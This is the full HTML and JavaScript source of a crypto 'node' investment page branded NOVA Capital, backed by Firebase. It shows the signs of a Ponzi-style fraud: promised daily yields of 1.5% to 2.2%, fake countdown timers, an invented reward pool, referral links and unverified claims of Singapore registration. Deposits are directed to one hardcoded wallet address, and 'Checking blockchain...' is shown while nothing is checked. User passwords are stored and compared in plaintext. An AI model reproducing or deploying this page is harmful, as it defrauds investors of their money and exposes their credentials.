<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NOVA | Enterprise Asset Protocol</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #0A192F; --accent: #64FFDA; --card-bg: #112240; --text-main: #CCD6F6; --text-dim: #8892B0; --gold: #FFD700; }
        body { margin: 0; font-family: 'Inter', sans-serif; background: var(--primary); color: var(--text-main); line-height: 1.6; }
        
        /* Glassmorphism UI */
        .glass { background: rgba(17, 34, 64, 0.85); backdrop-filter: blur(10px); border: 1px solid rgba(100, 255, 218, 0.1); border-radius: 12px; padding: 20px; margin-bottom: 20px; }
        .ticker { background: #020c1b; color: var(--accent); padding: 8px; font-size: 11px; text-align: center; border-bottom: 1px solid #112240; }
        
        /* Dashboard Grid */
        #dashboard { display: none; padding: 20px; max-width: 1200px; margin: auto; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 20px; }
        .stat-card { text-align: center; padding: 15px; border-top: 3px solid var(--accent); }
        .stat-card h2 { margin: 5px 0; color: var(--accent); }

        /* Node System */
        .node-container { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; }
        .node-card { background: var(--card-bg); border-radius: 12px; overflow: hidden; position: relative; transition: 0.3s; }
        .node-card:hover { transform: translateY(-5px); border: 1px solid var(--accent); }
        .node-img { width: 100%; height: 150px; object-fit: cover; opacity: 0.7; }
        .node-info { padding: 15px; }
        .timer { font-family: monospace; color: var(--gold); font-size: 14px; }

        /* Tabs & Inputs */
        .btn-prime { width: 100%; padding: 12px; background: var(--accent); color: var(--primary); border: none; border-radius: 5px; font-weight: 800; cursor: pointer; margin-top: 10px; }
        input, select { width: 100%; padding: 12px; background: #020c1b; border: 1px solid #233554; color: white; border-radius: 5px; margin: 10px 0; }

        /* Legal & Info */
        .info-section { font-size: 13px; color: var(--text-dim); margin-top: 50px; border-top: 1px solid #233554; padding-top: 20px; }
        
        #auth-page { display: flex; align-items: center; justify-content: center; min-height: 100vh; background: url('https://images.unsplash.com/photo-1639322537228-f710d846310a?auto=format&fit=crop&q=80&w=2000') no-repeat center center fixed; background-size: cover; }
    </style>
</head>
<body>

    <div class="ticker"><marquee>SYSTEM STATUS: OPERATIONAL | REWARD POOL: 1,500,000 USDT | SECURE GLOBAL NODES: 15 ACTIVE</marquee></div>

    <div id="auth-page">
        <div class="glass" style="max-width: 380px; width: 90%;">
            <h2 style="text-align:center; color:var(--accent);">NOVA TERMINAL</h2>
            <input type="text" id="username" placeholder="Username">
            <input type="password" id="password" placeholder="Access Key">
            <button class="btn-prime" onclick="handleAuth()">Enter Terminal</button>
            <p style="text-align:center; font-size:12px; cursor:pointer;" onclick="toggleMode()">New? Register Account</p>
        </div>
    </div>

    <div id="dashboard">
        <div style="display:flex; justify-content:space-between; align-items:center;">
            <h1 style="color:var(--accent);">NOVA DASHBOARD</h1>
            <button onclick="logout()">Logout</button>
        </div>

        <div class="stats-grid">
            <div class="glass stat-card"><h3>$0.00</h3><p>Total Profit</p></div>
            <div class="glass stat-card"><h3>$0.00</h3><p>Daily Yield</p></div>
            <div class="glass stat-card"><h3>$0.00</h3><p>Withdrawals</p></div>
            <div class="glass stat-card"><h3>0.00</h3><p>Ref. Rewards</p></div>
        </div>

        <div class="glass">
            <h4>My Referral Link</h4>
            <div style="display:flex; gap:10px;">
                <input type="text" id="refLink" readonly>
                <button class="btn-prime" style="width:100px; margin:10px 0;" onclick="copyRef()">Copy</button>
            </div>
        </div>

        <h2>Active Infrastructure Nodes</h2>
        <div class="node-container">
            <div class="node-card">
                <img src="https://images.unsplash.com/photo-1558494949-ef010cbdcc51?auto=format&fit=crop&q=80&w=800" class="node-img">
                <div class="node-info">
                    <h4>Alpha-Cloud Node</h4>
                    <p>Cost: <span style="color:var(--accent);">100 USDT</span></p>
                    <p>Daily Profit: 1.5%</p>
                    <div class="timer">Ends in: 29d 23h 59m</div>
                    <button class="btn-prime" onclick="openDeposit('Alpha', 100)">Buy Node</button>
                </div>
            </div>
            <div class="node-card">
                <img src="https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&q=80&w=800" class="node-img">
                <div class="node-info">
                    <h4>Omega-Quantum Node</h4>
                    <p>Cost: <span style="color:var(--accent);">500 USDT</span></p>
                    <p>Daily Profit: 2.2%</p>
                    <div class="timer">Ends in: 44d 23h 59m</div>
                    <button class="btn-prime" onclick="openDeposit('Omega', 500)">Buy Node</button>
                </div>
            </div>
        </div>

        <div class="glass" style="margin-top:30px;">
            <h3>Transaction History</h3>
            <div id="history-log" style="font-size:12px; color:var(--text-dim);">No transactions found yet.</div>
        </div>

        <div class="info-section">
            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:30px;">
                <div>
                    <h4>Company Details</h4>
                    <p>NOVA Capital Ltd. is a registered asset management protocol specialized in high-frequency liquidity provision. Headquartered in Singapore.</p>
                </div>
                <div>
                    <h4>FAQ</h4>
                    <details><summary>Minimum Withdrawal?</summary><p>Minimum withdrawal is 10 USDT.</p></details>
                    <details><summary>Activation Time?</summary><p>Nodes are activated after 3 blockchain confirmations.</p></details>
                </div>
            </div>
            <p style="margin-top:20px; font-size:10px;">Privacy Policy | Terms of Service | Anti-Money Laundering Compliance</p>
        </div>
        
        <footer id="secret-trigger" style="text-align:center; padding:20px; font-size:10px;">&copy; 2026 NOVA CAPITAL GLOBAL</footer>
    </div>

    <div id="deposit-modal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); align-items:center; justify-content:center; z-index:100;">
        <div class="glass" style="width:90%; max-width:400px;">
            <h3 id="dep-title">Activate Node</h3>
            <p>Send Amount: <span id="dep-amt" style="color:var(--accent);"></span> USDT</p>
            <div style="background:#020c1b; padding:10px; border-radius:5px; font-family:monospace; color:var(--accent); font-size:12px;" onclick="copyWallet()">0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2</div>
            <input type="text" id="txid" placeholder="Paste TID/Hash">
            <input type="file" id="proofImg" accept="image/*">
            <button class="btn-prime" onclick="submitFinal()">Confirm Activation</button>
            <button style="background:none; border:none; color:gray; width:100%; margin-top:10px; cursor:pointer;" onclick="closeModal()">Cancel</button>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, collection, getDocs } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo",
            authDomain: "home-94d45.firebaseapp.com",
            projectId: "home-94d45",
            appId: "1:964390949419:web:589840cb91b7e42ecd506e"
        };
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // --- AUTH LOGIC ---
        window.handleAuth = async () => {
            const u = document.getElementById('username').value.toLowerCase().trim();
            const p = document.getElementById('password').value;
            if(!u || !p) return alert("All fields required, sweetie.");
            
            const snap = await getDoc(doc(db, "users", u));
            if(snap.exists()) {
                if(snap.data().password === p) {
                    sessionStorage.setItem("user", u);
                    location.reload();
                } else { alert("Wrong key, sweetie."); }
            } else {
                await setDoc(doc(db, "users", u), { password: p, balance: 0, ref: u + "_nova" });
                alert("Welcome to NOVA! Account registered.");
                location.reload();
            }
        };

        // --- UI FUNCTIONS ---
        function showDashboard() {
            const user = sessionStorage.getItem("user");
            document.getElementById('auth-page').style.display = 'none';
            document.getElementById('dashboard').style.display = 'block';
            document.getElementById('refLink').value = window.location.origin + "/nova/?ref=" + user;
        }

        window.openDeposit = (name, amt) => {
            document.getElementById('dep-title').innerText = "Activate " + name + " Node";
            document.getElementById('dep-amt').innerText = amt;
            document.getElementById('deposit-modal').style.display = 'flex';
        };

        window.closeModal = () => document.getElementById('deposit-modal').style.display = 'none';

        window.submitFinal = async () => {
            const tid = document.getElementById('txid').value;
            const file = document.getElementById('proofImg').files[0];
            if(!tid || !file) return alert("Fill all details, sweetie.");
            
            const reader = new FileReader();
            reader.onloadend = async () => {
                await setDoc(doc(db, "deposits", "tx_" + Date.now()), {
                    user: sessionStorage.getItem("user"),
                    tid: tid,
                    proof: reader.result,
                    status: "Pending",
                    node: document.getElementById('dep-title').innerText
                });
                alert("Activation request sent! Checking blockchain...");
                location.reload();
            };
            reader.readAsDataURL(file);
        };

        window.copyWallet = () => { navigator.clipboard.writeText("0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2"); alert("Address Copied!"); };
        window.copyRef = () => { navigator.clipboard.writeText(document.getElementById('refLink').value); alert("Referral Link Copied!"); };
        window.logout = () => { sessionStorage.clear(); location.reload(); };

        if(sessionStorage.getItem("user")) showDashboard();
    </script>
</body>
</html>
